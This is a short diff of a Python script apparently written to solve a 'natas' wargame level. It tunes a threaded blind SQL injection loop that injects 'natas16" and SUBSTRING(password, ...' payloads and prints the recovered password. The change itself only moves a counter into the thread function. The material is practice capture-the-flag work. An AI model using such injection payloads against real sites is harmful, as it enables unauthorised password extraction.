@@ -13,7 +13,7 @@ headers = {
 x = 1
 
 def payload_function():
-    global inputs,password,headers
+    global x,inputs,password,headers
 
     for i in range(len(inputs)):
         payload = 'natas16\" and SUBSTRING(password, ' + str(
@@ -32,6 +32,7 @@ def payload_function():
             print(payload)
             print(password)
             break
+    x=x+1
 
 while True:
     threads = []
@@ -40,8 +41,6 @@ while True:
         p = threading.Thread(target=payload_function)
         p.start()
         threads.append(p)
-    
-    x=x+1
 
     for thread in threads:
         thread.join()
